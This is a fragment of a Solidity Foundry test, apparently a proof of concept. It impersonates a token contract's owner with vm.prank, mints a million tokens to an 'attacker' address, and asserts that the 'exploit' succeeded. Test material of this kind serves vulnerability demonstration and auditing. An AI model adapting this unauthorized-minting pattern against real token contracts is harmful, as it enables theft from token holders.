        uint256 initialTokenBalance = tokenContract.balanceOf(attacker);
        console.log("Initial attacker balance:", initialTokenBalance);

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);

        // Mint a large amount - using 1,000,000 tokens with decimals
        uint256 decimals = tokenContract.decimals();
        uint256 mintAmount = 1_000_000 * (10 ** decimals);
        tokenContract.mint(attacker, mintAmount);

        // Get new balance
        uint256 newBalance = tokenContract.balanceOf(attacker);
        console.log("New attacker balance:", newBalance);

        // Verify balance increased
        assertGt(newBalance, initialTokenBalance, "Attacker balance should have increased");
        console.log("Exploit successful: Minted", mintAmount, "tokens to attacker");
